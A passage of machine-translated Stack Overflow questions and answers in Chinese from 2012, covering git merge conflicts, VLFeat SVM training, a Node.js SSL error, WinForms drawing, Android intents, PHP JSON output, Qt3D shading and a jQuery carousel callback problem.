> 时间：2012-06-18T23:28:00.200

在这我怀疑子查询的实际根本原因是匿名类型构造函数。因为您选择的不是已知实体，而是从其他实体值构造的任意对象，所以 EF 解析器需要确保它可以生成准确的字段集——无论是来自单个表、连接表、计算字段还是其他子查询等。表达式树解析器非常擅长尽可能从 LINQ 查询中编写 SQL 语句，但它并不是无所不知的。它以系统的方式处理查询，这将始终产生正确的结果（从某种意义上说，您得到了您所要求的），但并不总是最佳结果。

至于重写查询以消除子选择，首先：我没有看到明显的方法可以消除匿名类型并产生正确的结果。不过，更重要的是，我***不会打扰***。像 Sybase 这样的现代 SQL 服务器非常聪明——通常比开发人员更聪明——并且非常擅长从查询中生成最佳查询计划。除此之外，EF 喜欢子查询，因为它们是自动编写复杂查询的好方法。即使您的 LINQ 查询没有出现使用它们，您也经常会发现它们。试图从您的查询中消除它们将很快成为徒劳的练习。

# git - CONFLICT（内容）：合并冲突

> ID：11091969
> 
> 赞同：11
> 
> 时间：2012-06-18T22:25:35.973
> 
> 标签：git, conflict, git-pull

我有一台带遥控器的服务器，每当我`git pull`在文件中得到那些愚蠢的 ====== 和 HEAD >>>> 东西时，都会导致我的服务器无法正常工作。每次我想将服务器更新为与我的源/主服务器相同时，如何防止这种情况发生？

这就是我所做的：

```
git pull production master 
```

然后我得到了这个：

```
CONFLICT (content): Merge conflict in 
```

当我这样做时，`git status`我得到了这个：

```
Unmerged paths:
(use "git add/rm <file>..." as appropriate to mark resolution)

    both modified:      photocomp/settings.py
    both modified:      photocomp/wsgi.py 
```

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-09-26T09:31:40.447

但这不是愚蠢的事情:) Git通过这种方式标记冲突（请参阅[Git 中的合并冲突）。](http://genomewiki.ucsc.edu/index.php/Resolving_merge_conflicts_in_Git#Git_can_fail_during_the_merge)您必须尝试覆盖尚未推送的更改。

`<<<<<<<`: 表示有合并冲突的行的开始。

`=======`：表示用于比较的断点。将用户已提交的更改（上）分解为来自合并的更改（下），以直观地查看差异。

`>>>>>>>`: 表示有合并冲突的行的结尾。

通过编辑文件以手动合并 git 无法合并的文件部分来解决冲突。这可能意味着放弃您或其他人的更改，或者将两者混合使用。您还需要删除文件中的`<<<<<<<`、`=======`和`>>>>>>>`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T23:06:24.093

好像您在本地修改文件。

如果您想保留远程 master 的原始分支，我建议您将远程 master 拉到单独的分支中，就像您似乎所做的那样，但在单独的分支中进行任何修改。

# computer-vision - 使用 VLFEAT 实现词袋对象识别

> ID：11091972
> 
> 赞同：3
> 
> 时间：2012-06-18T22:25:56.100
> 
> 标签：computer-vision, svm, sift

我正在尝试在 matlab 中实现 BOW 对象识别代码。这个过程有点复杂，我在找到有关该过程的适当文档时遇到了很多麻烦。那么有人可以仔细检查我下面的计划是否有意义吗？我在这里广泛使用[VLSIFT 库](http://www.vlfeat.org/index.html)

```
Training:
1\. Extract SIFT image descriptor with VLSIFT
2\. Quantize the descriptors with k-means(vl_hikmeans)
3\. Take quantized descriptors and create histogram(VL_HIKMEANSHIST)
4\. Create SVM from histograms(VL_PEGASOS?) 
```

我了解步骤 1-3，但我不太确定 SVM 的功能是否正确。VL_PEGASOS 采用以下内容：

```
W = VL_PEGASOS(X, Y, LAMBDA) 
```

我如何将这个函数与我创建的直方图一起使用？

最后在识别阶段，如何将图像与 SVM 定义的类匹配？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-03T16:31:45.280

你看过他们的[Caltech 101 示例代码](http://www.vlfeat.org/applications/apps.html)吗，这是 BoW 方法的完整实现。

这是他们用飞马分类并评估结果的部分：

```
% --------------------------------------------------------------------
%                                                            Train SVM
% --------------------------------------------------------------------

lambda = 1 / (conf.svm.C *  length(selTrain)) ;
w = [] ;
for ci = 1:length(classes)
  perm = randperm(length(selTrain)) ;
  fprintf('Training model for class %s\n', classes{ci}) ;
  y = 2 * (imageClass(selTrain) == ci) - 1 ;
  data = vl_maketrainingset(psix(:,selTrain(perm)), int8(y(perm))) ;
  [w(:,ci) b(ci)] = vl_svmpegasos(data, lambda, ...
                                  'MaxIterations', 50/lambda, ...
                                  'BiasMultiplier', conf.svm.biasMultiplier) ;

  model.b = conf.svm.biasMultiplier * b ;
  model.w = w ;

% --------------------------------------------------------------------
%                                                Test SVM and evaluate
% --------------------------------------------------------------------

% Estimate the class of the test images
scores = model.w' * psix + model.b' * ones(1,size(psix,2)) ;
[drop, imageEstClass] = max(scores, [], 1) ;

% Compute the confusion matrix
idx = sub2ind([length(classes), length(classes)], ...
              imageClass(selTest), imageEstClass(selTest)) ;
confus = zeros(length(classes)) ;
confus = vl_binsum(confus, ones(size(idx)), idx) ; 
```

# node.js - nodejs中的SSL错误

> ID：11091974
> 
> 赞同：11
> 
> 时间：2012-06-18T22:26:02.340
> 
> 标签：node.js, ssl, request

我正在尝试通过节点 https.request() 获取网页。这样做会导致我的代码记录错误。使用节点请求模块具有相同的结果：

***请求问题：140398870042432：错误：140773F2：SSL 例程：SSL23_GET_SERVER_HELLO:sslv3 警报意外消息：s23_clnt.c:658：***

以下表示正在使用错误的 SSL 版本，但我找不到更改版本的方法：[curl error: "sslv3 alert unexpected message"](https://stackoverflow.com/questions/10047407/curl-error-sslv3-alert-unexpected-message)。从我的终端使用 curl 会返回一个响应，就像在我的浏览器中点击 URL（它是一个登录页面）一样。我的代码如下。

```
var request = require('request')
request.get("https://icmserver.wit.ie/balance", function(err, res, body) {
    if (err) {
        return console.log(err)
    }
    return body;
}); 
```

有谁知道这里可能发生什么？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-07-10T07:22:40.687

尝试`options = { secureProtocol: 'SSLv3_method' }`在您提出的请求中使用。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-10-02T01:22:39.303

我们遇到了同样的问题。默认情况下，请求使用 https.globalAgent。所以我们在脚本顶部附近添加了代码。

```
var https = require('https');
https.globalAgent.options.secureProtocol = 'SSLv3_method'; 
```

突然间，一切都奏效了。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-02-27T18:05:31.197

如果网站使用`ECDH`曲线，对我来说，问题只能通过添加此选项来解决：

```
request({ url, agentOptions: {
            ecdhCurve: 'P-521:P-384:P-256',
},(err,res,body) => { 
```

JFYI，可能这会对某人有所帮助。

# iphone - 委托方法如何知道何时调用

> ID：11091975
> 
> 赞同：3
> 
> 时间：2012-06-18T22:26:03.743
> 
> 标签：iphone, objective-c, ios, ipad, delegates

我只是想知道委托方法究竟是如何知道何时调用的？例如，在`UITextFieldDelegate`协议中，`textFieldDidBeginEditing:`当在文本字段中开始编辑时调用该方法（前提是我实现了此方法）。

那么代码究竟是如何检测何时调用的`textFieldDidBeginEditing:`呢？系统是否只检查是否`textFieldDidBeginEditing:`已经实现以及是否运行该方法？引擎盖下有什么我没有看到的吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T22:37:19.183

确切地。

我不能保证 Apple 的框架代码是如何在底层实现的，但一个非常普遍的说法是：

```
if ([[self delegate] respondsToSelector:@selector(someInstance:didDoSomethingWith:)]) {
    [[self delegate] someInstance:self didDoSomethingWith:foo];
} 
```

这允许您拥有可选的委托方法，这似乎是您的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T22:33:51.827

该代码不会“检测何时调用”委托方法。textField 接收一个事件，并调用它的委托上的方法（实现了 textFieldDidBeginEditing: 方法）。

简而言之，当您点击文本字段开始编辑时，文本字段会显示*“*哦，我正在编辑！” 并在内部调用`[self.delegate textFieldDidBeginEditing:self]`，其中委托是您设置为委托的实例（通常是 UIViewController 子类）

# c# - 在 Winforms 中绘图

> ID：11091978
> 
> 赞同：0
> 
> 时间：2012-06-18T22:26:20.903
> 
> 标签：c#, winforms, drawing

我已经编写了这段代码，但是它不起作用。这不仅行不通，而且我尝试过的绘图方法都没有奏效。我花了一两个多小时试图解决这个问题，但没有成功。我尝试过简单的程序，它所做的只是显示一条小线，但无论我做什么它都不会工作：c

我做错了什么，或者什么可能导致这种情况？

```
private void pictureBox1_MouseDown(object sender, 
                                   MouseEventArgs m, 
                                   EventArgs e, 
                                   PaintEventArgs q)
{
    if (m.Button == System.Windows.Forms.MouseButtons.Left)
    {
        Point currpoint = System.Windows.Forms.Cursor.Position;

        Point origin = new Point(0, 0);

        decimal sizee = nud.Value;

        int size = Convert.ToInt32(sizee);

        Random randonGen = new Random();

        Color randomColor = Color.FromArgb(randonGen.Next(255),
                                           randonGen.Next(255),
                                           randonGen.Next(255));

        Pen selPen = new Pen(randomColor, size);

        Graphics g = Graphics.FromImage(pictureBox1.Image);

        g.DrawLine(selPen, 3, 3, 133, 133);
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-18T22:32:30.260

尝试添加一个

```
pictureBox1.Invalidate(); 
```

称呼。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T22:32:55.463

这不是绘制图片框的正确方法：

```
private void pictureBox1_MouseDown(object sender, 
                                   MouseEventArgs m, 
                                   EventArgs e, 
                                   PaintEventArgs q)
{
    if (m.Button == System.Windows.Forms.MouseButtons.Left)
    {
        Point currpoint = System.Windows.Forms.Cursor.Position;

        Point origin = new Point(0, 0);

        decimal sizee = nud.Value;

        int size = Convert.ToInt32(sizee);

        Random randonGen = new Random();

        Color randomColor = Color.FromArgb(randonGen.Next(255),
                                           randonGen.Next(255),
                                           randonGen.Next(255));

        Pen selPen = new Pen(randomColor, size);

        using(Graphics g = pictureBox1.CreateGraphics()) // Use the CreateGraphics method to create a graphic and draw on the picture box. Use using in order to free the graphics resources.
        {
             g.DrawLine(selPen, 3, 3, 133, 133);
        }
    }
} 
```

顺便说一句，此方法将创建一个临时图像，该图像在控件无效时被重置。对于更持久的绘图，您需要监听图片框的 Paint 事件并在那里绘制您的图形。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-08-18T10:41:56.127

您必须先从图像中绘制它。然后将其附加到`pictureBox1`

```
Bitmap canvas = new Bitmap(pictureBox1.Width, pictureBox1.Height);
Graphics g = Graphics.FromImage(canvas);

Point currpoint = System.Windows.Forms.Cursor.Position;

Point origin = new Point(0, 0);

decimal sizee = nud.Value;

int size = Convert.ToInt32(sizee);

Random randonGen = new Random();

Color randomColor = Color.FromArgb(randonGen.Next(255),
                                   randonGen.Next(255),
                                   randonGen.Next(255));

Pen selPen = new Pen(randomColor, size);

g.DrawLine(selPen, 3, 3, 133, 133);
pictureBox1.image = canvas; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-06-25T18:19:08.090

这是一个老问题，如果其他人也有类似的问题。见下文。首先让我们检查一下 Ops 代码。

(1)**查看代码：**建议的第一个更改是保持 Pen 的格式简单，直到我们更好地了解 Pen 在绘制图形时的实际工作方式。看看我们从图像创建图形的 Op 行，这是一个很好的例子，说明如何通过使用位图的图形上下文直接绘制（“这意味着写入”）到提供的位图。接下来，Op 提供了一个很好的 Graphics DrawLine 方法示例，该方法可以将定义的线绘制到提供的位图上。

(2) 由于缺少细节，我们必须对 Op 提供的位图以及他们在位图上画线的方法做出以下假设。假设这个pictureBox1中已经存在一个图像；如果未设置图像，我们从图像获得的图形将来自空图像，或者每个像素将是黑色的，就像脚注一样：

(a) Pen 的颜色是否对现有位图是唯一的，并且颜色的 Alpha 分量是否足够高，可以在绘制时实际看到生成的颜色（如果有疑问，请使用唯一的**纯色**或至少将**Alpha 通道**设置为 255） ?

(b) Op 想要绘制的这条线**从左**3 开始，**前**3 到**左**133，即位图左侧右侧 3 像素，该线的高度为 133，因此笔的线大小已更改为演示目的，宽度 = 3。

(c) 最后的考虑，**pictureBox1.Size**是否足以让我们看到这条画线？线条的几何形状形成一个类似于 RectangleF(3, 3, 3, 133) 结构的矩形，因此如果 pictureBox1 **Bounds 矩形**与派生线条的矩形相交，则该**相交**的区域就是可以绘制线条并视为可见的区域。

在我们可以从图形绘制到 pictureBox1 图像之前，我们必须首先将 pictureBox1 图像数据转换回可用的图像类型，例如位图。原因是图片框仅以数组格式存储像素数据，如果不转换为图像类型，GDI/GDI+ 不能直接使用。bitamp，jpeg，png等。

**如果您通过自定义用户控件**和正确处理 PaintEventArgs **OnPaint**实现和/或通过使用相关的图形屏幕缓冲区上下文场景来处理自己的绘画，则可以避免这种混乱的转换。

**对于那些只想知道缺少什么的人：**

```
 private void button1_Click(Object sender, EventArgs e)
    {
        Pen selPen = new Pen(Color.Red, 2);  //  The Op uses random color which is not good idea for testing so we'll choose a solid color not on the existing bitmap and we'll confine our Pen's line size to 2 until we know what we're doing.

        //  Unfortionately the picture box "image" once loaded is not directly usable afterwords.

        //  We need tp recreate the pictureBox1 image to a usable form, being the "newBmp", and for efficiency the bitmap type is chosen
        Bitmap newBmp = new Bitmap(pictureBox1.Width, pictureBox1.Height, PixelFormat.Format32bppArgb); // Tip: Using System.Drawing.Imaging for pixel format which uses same pixel format as screen for speed

        // We create the graphics from our new and empty bitmap container
        Graphics g = Graphics.FromImage(newBmp);

        // Next we draw the pictureBox1 data array to our equivelent sized bitmap container
        g.DrawImage(pictureBox1.Image, 0, 0);

        g.DrawLine(selPen, 3, 3, 3, 133);  // Format: (pen, x1, y1, x2, y2)
        pictureBox1.Image = newBmp;

        //  Don't forget to dispose of no longer needed resources
        g.Dispose();
        selPen.Dispose();
        newBmp.Dispose(); // or save newBmp to file before dispose ie. newBmp.Save("yourfilepath", ImageFormat.Jpeg) or in whatever image type you disire;
    } 
```

到目前为止，操作的代码只在位图表面画一条线，如果我们要“看到”这个变化，我们必须将**位图保存到文件**中以便稍后在图像查看器中查看，或者我们必须将更新的位图绘制到我们的显示监视器，**屏幕**。_

有几种方法可以绘制到显示器的屏幕上。可以使用的最常见的图形上下文是**Control.CreateGraghics**，从 ( **PaintEventArgs** ) 到屏幕的图形方​​法和/或使用有时称为并用作手动**双缓冲图形上下文**的图形屏幕缓冲区，其中所有内容都是通过以下方式实现的来自图形的**DrawImage方法。**

最简单的解决方案（在这种情况下基于 Op 自己的代码）是使用 pictureBox1 控件显示这个新更新的位图。我们将简单地使用新更新的位图更新控件的图像，当然，一旦第一次转换为使用图形图像，如上面的代码描述中所示。

快乐编码！

# c# - 如何将假的 ASP.NET WebMethod HTTP 代理转换为真正的代理？

> ID：11091979
> 
> 赞同：0
> 
> 时间：2012-06-18T22:26:21.450
> 
> 标签：c#, asp.net, jquery, webclient, http-proxy

我正在构建一个富 Web 客户端，它使用 AJAX 与 RESTful API 进行通信。为了绕过跨域浏览器限制，我在 C# 和 ASP.NET 中编写了一个超级简单（但假的）HTTP 代理，以便我在**http://localhost**上的客户端应用程序可以与**http://restful.api.com 通信**。

其他人会用 Java 编写一个“适当的”代理，所以我最初的任务是**“保持简单”**。我当前的版本只是一个**静态的 ASP.NET [WebMethod]**，它根据字符串数组中的值盲目地创建一个 URL 和可选的 QueryString。

对于 GET、POST 和 PUT 操作，我创建了**System.Net.WebClient()**的一个实例，然后调用*client.downloadString(...)*或*client.UploadData(...)*。该方法返回一个字符串，因此我丢失了 RESTful API 返回的所有标头和响应代码。

这很好上手，但现在我需要**转换为一个成熟的代理**，它可以处理标头、响应代码、有效负载以及您使用真正的代理获得的任何其他内容。

是否可以**改造**下面的代码片段，或者我需要从头开始重写一些东西？

这是网络方法：

```
[WebMethod]
public static string rest(string[] values, string[] queryStringParams, string verb, string jsonData)
{
    string r = WebAppUtils.UnifiedMessagingApi(values, queryStringParams, verb, jsonData);

    return r;
} 
```

这是工作者方法（仅显示 GET 和 POST）。对不起，我试图为这个问题尽可能多地修剪掉绒毛。）

```
public static string UnifiedMessagingApi(string[] values, string[] queryStringParams, string verb, string jsonData)
{
    var r = String.Empty;

    var query = String.Format("{0}{1}", BaseUrl, String.Join("/", values));

    if (queryStringParams.Length > 0)
    {
        var queryString = String.Join("&", queryStringParams);

        query = query + "?" + queryString;
    }

    using (var client = new WebClient())
    {
        client.Encoding = Encoding.UTF8;
        client.Headers.Add("Content-Type","application/json; charset=utf-8");

        client.Proxy = null;

        switch (verb)
        {
            case HttpVerb.GET:
                try
                {
                    r = client.DownloadString(query);
                }
                catch (WebException ex)
                {
                    System.Diagnostics.Debug.WriteLine(ex.Status);
                }
                break;

            case HttpVerb.POST:
                try
                {
                    var encoding = new System.Text.UTF8Encoding();
                    Byte[] data = encoding.GetBytes(jsonData);

                    // Call the REST API
                    Byte[] retValBytes = client.UploadData(query, verb, data);

                    // Convert the byte array to a string
                    r = System.Text.UTF8Encoding.Default.GetString(retValBytes);
                }
                catch (WebException ex)
                {
                    System.Diagnostics.Debug.WriteLine(ex.Status);
                }
                break;
        }
    }

    return r;
} 
```

谢谢！

# android - 如何使用 Intent.ATTACH_DATA

> ID：11091980
> 
> 赞同：6
> 
> 时间：2012-06-18T22:26:27.080
> 
> 标签：android

我正在尝试为图像实现“设置为”功能。我正在使用 Intent.ATTACH_DATA，因此用户至少可以选择联系人照片和壁纸。我应该通过的额外内容让我感到困惑。如果我正确阅读了文档，

```
Intent intent = new Intent(Intent.ACTION_ATTACH_DATA);
    intent.setType("image/*");
intent.setData(mImageCaptureUri);
        startActivity(Intent.createChooser(intent, "hey")); 
```

应该都是。这适用于壁纸，但对于百万像素数据，应用程序会崩溃，因为找不到裁剪活动。有人有一个工作的例子吗？官方图库应用程序确实设法找到了 camera.crop 活动......

也欢迎提供关于在哪里可以找到详细的系统意图文档的一般提示。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-06-19T07:19:11.867

在通过 android 源代码的漫长而曲折的道路后，我在默认画廊 (gallery3d) 应用程序中找到了实际代码。我适应了在我自己的应用程序中使用，为了方便在其他应用程序中导入时再次重写了它。如果您使用或欣赏这个，我要求您支持这个答案。

改编自：[grepcode 上的gallery3d 源代码](http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android-apps/4.0.4_r1.2/com/android/gallery3d/ui/MenuExecutor.java?av=f)

用法：更改第一行以匹配照片的完整路径（以 /mnt/ 开头）。将字符串“set_as”添加到您的 strings.xml 作为操作选择器标题。

```
String absolutepath = MyApplication.appRootDir + relpath;//change for your application
    Intent intent = new Intent(Intent.ACTION_ATTACH_DATA);
    MimeTypeMap map = MimeTypeMap.getSingleton();
    String ext = absolutepath.substring(absolutepath.lastIndexOf('.') + 1);
    String mimeType = map.getMimeTypeFromExtension(ext);
    Uri uri = Uri.fromFile(new File(absolutepath));
    intent.setDataAndType(uri, mimeType);
    intent.putExtra("mimeType", mimeType);
    intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
    Activity activity = (Activity) this;
    activity.startActivity(Intent.createChooser(
            intent, activity.getString(R.string.set_as))); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2018-04-16T07:40:38.833

上面的答案很好，但是这是我测试和使用的一个。

```
 private void setAsWallpaper(String path_of_file) {    
    try {
        Intent intent = new Intent();
        intent.setAction(Intent.ACTION_ATTACH_DATA);
        File file = new File(path_of_file);
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_WHEN_TASK_RESET);
        intent.setDataAndType(FileProvider.getUriForFile(context, BuildConfig.APPLICATION_ID + ".provider", file), getMimeType(path_of_file);
        context.startActivity(intent);
    } catch (ActivityNotFoundException e) {
        Toast.makeText(context, "Exception generated", Toast.LENGTH_SHORT).show();
    }
}

 private static String getMimeType(String url) {
    String type = null;
    String extension = MimeTypeMap.getFileExtensionFromUrl(url);
    if (extension != null) {
        type = MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension);
    }
    return type;
} 
```

并简单地调用 setAsWallpaper(path); 这里的路径是文件的绝对路径。

# java - 需要方法签名方面的帮助

> ID：11091987
> 
> 赞同：1
> 
> 时间：2012-06-18T22:27:09.770
> 
> 标签：java

我发现调用堆栈有助于在源代码中查找方法调用程序的行号，但假设我正在处理字节码并且没有源代码。我需要找到某种方法来查找调用者方法签名。请提出一些解决方案。

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T22:39:46.987

尝试[javap](http://docs.oracle.com/javase/1.5.0/docs/tooldocs/windows/javap.html)，例如

```
$ ls
ICODecoder.class

$ javap ICODecoder    
public class net.sf.image4j.codec.ico.ICODecoder extends java.lang.Object{
    public static java.util.List read(java.io.File)       throws java.io.IOException;
    public static java.util.List readExt(java.io.File)       throws java.io.IOException;
    public static java.util.List read(java.io.InputStream)       throws java.io.IOException;
    public static java.util.List readExt(java.io.InputStream)       throws java.io.IOException;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T22:38:04.237

新异常().printStacktrace(); 然后使用反编译器

# php - 从 MySQL 查询返回 JSON 响应

> ID：11091988
> 
> 赞同：1
> 
> 时间：2012-06-18T22:27:14.293
> 
> 标签：php, jquery, mysql, json

我有一个像这样的 jQuery AJAX 函数：

```
$.ajax({
    url: 'crud/clients.php',
    dataType: 'json',
    type: 'POST',
    data: { 
        id:rowID,
        clientID:$('#clientID').val(),
        clientName:$('#clientName').val()
    }
    success: function(data){ 
        alert(data); 
    }
}); 
```

`clients.php`然后我在文件中设置我的查询。最后，我用这一行执行查询：

```
mysql_query( $sql ) or die(mysql_error()); 
```

如何以 JSON 格式返回该查询的结果，以便我的 AJAX 函数可以捕获返回的任何内容？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-18T22:29:41.493

试试这个 ：

```
$q = mysql_query( $sql ) or die(mysql_error());
$res = json_encode(mysql_fetch_assoc($q));
echo $res; 
```

你也可以看看：[jQuery.getJSON](http://api.jquery.com/jQuery.getJSON/) & [jQuery.parseJSON](http://api.jquery.com/jQuery.parseJSON/)

# android - 从外部获取Android模拟器中触摸事件的坐标

> ID：11091989
> 
> 赞同：1
> 
> 时间：2012-06-18T22:27:22.023
> 
> 标签：android, android-emulator, emulation, android-view

我想实时记录在 Android 模拟器上进行的触摸的像素 xy 坐标，该模拟器独立于应用程序并且可用于模拟器外部的程序（可能是更新的文本文件或流）。我知道，`MotionEvent`但这不是独立于应用程序的（需要编辑将使用的任何应用程序的代码）。

基本上，我想要`Dev Tools/Development Settings/Pointer Location`模拟器上的功能，它会记录最新的触摸事件，并可以将坐标信息发送到模拟器外部。

无论如何，我可以做到这一点吗？

# c++ - 从非线程阻塞消息框获取结果？

> ID：11091990
> 
> 赞同：0
> 
> 时间：2012-06-18T22:27:25.813
> 
> 标签：c++, user-interface

通常，消息框的工作方式如下：

```
if(ShowMessageBox("Title","Text",MB_YES_NO) == MB_YES)
{
   //the user responded yes
} 
```

但是，我正在开发一个我制作了 gui 系统的游戏，当显示一个消息框时，背景中仍然会发生动画，所以我不能简单地阻止线程，动画会停止。

现在，它的工作方式是显示消息框，必须提供 IMessageHandler* 并使用对话结果调用它。

我想知道我是否忽略了什么。有没有更好的方法来做到这一点，它可能更像通常的做法。其他游戏如何接近它？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T22:51:07.593

有多种选择，例如..

1.  创建一个 View-Model 类，消息框从（标题、消息、按钮文本）读取并写入（关闭前的结果），在显示之前将 VM 传递到您的消息框，然后在关闭后从 VM 读取结果。

    （更好的技术是使用命令模式或在消息框上放置一个事件，而不是将 VM 传递给消息框，然后在命令/事件处理程序中更新 VM）。

2.  使用命令模式或事件将结果从消息框（关闭之前）直接传递给调用者（或查看模型）。

3.  使用显示对话框样式调用消息框（阻塞），但是，在单独的线程上执行此操作，然后将结果写入主线程可以读取的位置。

# qt - Qt3d + glShadeModel

> ID：11091993
> 
> 赞同：2
> 
> 时间：2012-06-18T22:27:45.533
> 
> 标签：qt, opengl, qt3d

最近我开始使用 qt3d（使用它的 QGlView 和 QGLSceneNode）。我为生成的模型提供每个顶点法线，现在想为我的建模应用程序使用 GL_FLAT 着色模型。但是对 glShadeModel(GL_FLAT) 的简单调用并没有做任何事情 - 阴影看起来像在平滑模式下

我试图找到 qt3d/qopengl 调用该函数的位置，但除了 QGLBuilder 找不到任何东西。

在我看来，我必须对 QOpenGLContext 做一些事情才能使本机 opengl 函数工作（我对其他一些 opengl 函数也有同样的问题）

或者 QGLPainter/QGLSceneNode 内部设置着色模型，我根本不用它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T23:19:40.457

我猜你已经找到了解决方案或放弃了，但为了完整起见，如果我理解正确的话，这应该会有所帮助：

`QGLPainter`通过“高级”效果设置着色程序，然后在绘制（渲染）时使用该效果`QGLSceneNode`。您可以使用此功能设置一些标准效果：

```
void QGLPainter::setStandardEffect(QGL::StandardEffect effect); 
```

标准效果[在文档](http://doc-snapshot.qt-project.org/5.0/qgl.html#StandardEffect-enum)中定义。如果你找不到你想要的，你可以使用这个函数传递一个用户效果：

```
void QGLPainter::setUserEffect(QGLAbstractEffect * effect) 
```

[`QGLShaderProgramEffect`](http://doc-snapshot.qt-project.org/5.0/qglshaderprogrameffect.html)`QGLAbstractEffect`在这种情况下继承并且是您要查找的类。

另请注意，Qt3D 类似于“高级”OpenGL 包装器。在大多数情况下（除了初始化代码和其他一些东西），直接调用 OpenGL 命令不是“正确的方法”。您应该告诉 Qt3D 渲染什么以及如何渲染，而不是告诉 OpenGL API。

# jquery - Jquery 创建插件 - 如何在动画回调方法中获取对我的对象的 $(this) 引用？

> ID：11091994
> 
> 赞同：0
> 
> 时间：2012-06-18T22:27:52.333
> 
> 标签：jquery, jquery-plugins, reference, jquery-animate, this

我有以下问题：我正在创建一个简单的插件 jquery carousel，用于为框中的图像设置动画。但是我遇到了以下问题，使用OO来构建插件，我使用它来引用我的对象。

但是其中一个函数使用了 jquery 的 animate 方法。我想以递归的方式做到这一点。因为动画是一个常数。但是在回调函数jquery animate中，this指的是对象动画，而不是我在插件本身执行时创建的对象。如何在动画中调用函数回调对象？我尝试在动画行代码之前直接调用函数 run()，但出现错误：Uncaught RangeError: Maximum call stack size exceeded

如果我将运行函数放在动画回调中，我会收到其他错误：

```
this.wraper.animate(
                   {top : '-='+image_height},
                        this.config.speed,
                        this.run()
                   ) 
```

或者

```
 this.wraper.animate(
                   {top : '-='+image_height},
                        this.config.speed,
                        function(){
                            this.run();
                        }
                   ) 
```

因为这是对 this.wraper 对象的引用，而不是对函数对象的引用似乎有点难以解释。

这是代码：

```
 (function($){

carouselClass = function (el, opts) {
        this.id = $(el).attr("id");        
        this.i = 0;                     
        this.config = opts;
        this.wraper;
        this.count = 0;
        this.flag = true;
        this.init = function() {
            // variables        
            var img = $("#"+this.id).find("img");       
            this.count = img.length;

            //adiciona css necessário a div wrapper
            $("#"+this.id).css("position","relative");
            $("#"+this.id).css("overflow","hidden");

            $("#"+this.id).append("<div></div>");       
            this.wraper = $("#"+this.id).find("div");           

            //definições css da div wrapper
            this.wraper.css("position","absolute");
            this.wraper.css("right","0px");                 
            var direction = this.config.direction;
            var container = this.wraper;
            //adiciona as imagens ao novo container
            img.each(function(){
                if(direction == "left" || direction == "right")
                    $(this).css("float", direction)

                $(this).css("display", "block");
                container.append($(this));                                          
            }); 

            //seta a largura e altura do wraper conforme a direção
            if(direction == "left" || direction == "right")
            {
                this.wraper.width((img.width()*this.count));
                this.wraper.height(img.height());
            }
            else
            {
                this.wraper.height((img.height()*this.count));
                this.wraper.width(img.width());
            }

            this.run(); 
        }           

        this.run = function()
        {                   
            if(this.config.direction == "top")
            {
                height = this.wraper.height();              
                image_height = height/this.count;                   
                for(j = 0; j < (this.count-1); j++)
                {
                    this.wraper.animate(
                        {top : '-='+image_height},
                        this.config.speed

                    )

                }
                this.wraper.animate(
                    {top:'0px'},
                    this.config.speed   
                );
                                    //my problem is this call to function recursive
                this.run();             
            }

            if(this.config.direction == "bottom")
            {
                height = this.wraper.height();              
                image_height = height/this.count;                   
                for(j = 0; j < (this.count-1); j++)
                {
                    this.wraper.animate(
                        {bottom : '-='+image_height},
                        this.config.speed

                    )

                }
                this.wraper.animate(
                    {bottom:'0px'},
                    this.config.speed   
                );
                                    //my problem is this call to function recursive
                this.run();         
            }

            if(this.config.direction == "left")
            {
                width = this.wraper.width();                
                image_width = width/this.count;                 
                for(j = 0; j < (this.count-1); j++)
                {
                    this.wraper.animate(
                        {left : '-='+image_width},
                        this.config.speed

                    )

                }
                this.wraper.animate(
                    {left:'0px'},
                    this.config.speed   
                );
                                    //my problem is this call to function recursive
                this.run();         
            }

            if(this.config.direction == "right")
            {
                width = this.wraper.width();                
                image_width = width/this.count;                 
                for(j = 0; j < (this.count-1); j++)
                {
                    this.wraper.animate(
                        {right : '-='+image_width},
                        this.config.speed

                    )

                }
                this.wraper.animate(
                    {right:'0px'},
                    this.config.speed   
                );
                                    //my problem is this call to function recursive
                this.run();         
            }

        }           
    };

$.fn.carousel = function(options)
{

    var opts = $.extend({}, $.fn.carousel.defaults, options);
    return this.each(function () {
            var instance = new carouselClass($(this), opts);
            /**********Start the carousel ***********/
            instance.init();                
        });

    $.fn.carousel.defaults = {
        'direction': "left",
        'speed': 3000
    };      

}    

 })(jQuery); 
```

如果我以这种方式调用，插件工作，但只有我设置为 i var 的次数，我希望轮播不断变化：

```
this.prepare = function()
        {
            this.i++;

            if(this.i < 3)
            {                   

                    this.run();
            }                           
        }

this.run = function()
        {                   
            if(this.config.direction == "top")
            {
                height = this.wraper.height();              
                image_height = height/this.count;                   
                for(j = 0; j < (this.count-1); j++)
                {
                    this.wraper.animate(
                        {top : '-='+image_height},
                        this.config.speed

                    )

                }
                this.wraper.animate(
                    {top:'0px'},
                    this.config.speed   
                );
                this.prepare();             
            }
                 } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T22:45:06.870

尝试使用`$.proxy()`

```
this.wraper.animate(
                   {top : '-='+image_height},
                        this.config.speed,
